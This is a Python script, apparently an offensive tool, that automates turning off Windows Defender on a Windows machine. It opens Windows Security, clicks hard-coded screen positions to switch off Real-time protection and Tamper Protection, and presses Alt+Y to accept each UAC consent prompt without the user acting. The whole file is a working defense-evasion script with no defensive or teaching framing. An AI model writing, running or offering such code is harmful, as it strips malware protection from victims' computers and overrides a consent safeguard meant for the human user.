"""
Disable Windows Defender Tamper Protection using pyautogui
Method: Open settings via URI, then use mouse clicks at window-relative positions
"""
import subprocess
import time
import pyautogui
import ctypes

# Set pyautogui settings
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0.3

def get_window_rect(window_title):
    """Get window position using Windows API"""
    import ctypes
    from ctypes import wintypes

    user32 = ctypes.windll.user32
    hwnd = user32.FindWindowW(None, window_title)
    if hwnd:
        rect = wintypes.RECT()
        user32.GetWindowRect(hwnd, ctypes.byref(rect))
        return (rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top)
    return None

def disable_tamper_protection():
    print("[*] Step 1: Opening Windows Security settings...")

    # Open Windows Security - Virus & threat protection
    subprocess.Popen('start windowsdefender://threatsettings', shell=True)
    time.sleep(3)

    # Get screen size for reference
    screen_w, screen_h = pyautogui.size()
    print(f"    Screen size: {screen_w}x{screen_h}")

    # Try to find Windows Security window
    win_rect = get_window_rect("Windows Security")
    if win_rect:
        x, y, w, h = win_rect
        print(f"    Window found at: ({x}, {y}), size: {w}x{h}")
    else:
        print("    Window not found, using screen center")
        x, y, w, h = 100, 100, 800, 600

    print("\n[*] Step 2: Clicking 'Manage settings' link...")
    # "Manage settings" is usually in the left side, below the header
    manage_x = x + 180
    manage_y = y + 420
    print(f"    Clicking at ({manage_x}, {manage_y})")
    pyautogui.click(manage_x, manage_y)
    time.sleep(2)

    print("\n[*] Step 3: Clicking Real-time protection toggle...")
    # The toggle is on the right side of the setting
    toggle_x = x + 580
    realtime_y = y + 280
    print(f"    Clicking at ({toggle_x}, {realtime_y})")
    pyautogui.click(toggle_x, realtime_y)
    time.sleep(1)

    print("[*] Step 4: Accepting UAC...")
    time.sleep(2)
    pyautogui.hotkey("alt", "y")
    time.sleep(2)

    print("\n[*] Step 5: Scrolling down to Tamper Protection...")
    # Click in the window first to focus, then scroll
    pyautogui.click(x + 400, y + 400)
    time.sleep(0.5)
    pyautogui.scroll(-3)  # Scroll down
    time.sleep(1)

    print("\n[*] Step 6: Clicking Tamper Protection toggle...")
    tamper_y = y + 480
    print(f"    Clicking at ({toggle_x}, {tamper_y})")
    pyautogui.click(toggle_x, tamper_y)
    time.sleep(1)

    print("[*] Step 7: Accepting UAC...")
    time.sleep(2)
    pyautogui.hotkey("alt", "y")
    time.sleep(2)

    print("\n" + "="*50)
    print("[+] DONE! Check Windows Security to verify.")
    print("="*50)

if __name__ == "__main__":
    print("\n" + "="*50)
    print("  DISABLE WINDOWS DEFENDER PROTECTIONS")
    print("="*50)
    print("\n[!] This will:")
    print("    1. Open Windows Security")
    print("    2. Click to turn OFF Real-time protection")
    print("    3. Click to turn OFF Tamper Protection")
    print("\n[!] DO NOT touch keyboard/mouse during this!")
    print("[!] Starting in 3 seconds...\n")
    time.sleep(3)
    disable_tamper_protection()

